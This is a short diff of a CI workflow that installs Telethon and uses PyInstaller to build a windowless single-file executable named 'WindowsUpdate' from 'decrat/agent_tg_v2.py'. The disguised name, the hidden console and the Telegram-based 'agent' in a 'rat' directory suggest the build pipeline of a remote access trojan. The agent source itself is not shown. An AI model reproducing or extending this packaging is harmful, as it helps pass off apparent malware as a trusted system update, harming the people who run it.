@@ -20,11 +20,11 @@ jobs:
 
       - name: Install dependencies
         run: |
-          pip install pyinstaller requests
+          pip install pyinstaller requests telethon
 
       - name: Build EXE
         run: |
-          pyinstaller --onefile --noconsole --name="WindowsUpdate" decrat/agent_tg.py
+          pyinstaller --onefile --noconsole --name="WindowsUpdate" --hidden-import=telethon --hidden-import=telethon.sync --hidden-import=telethon.sessions --collect-all telethon decrat/agent_tg_v2.py
 
       - name: Get version tag
         id: version
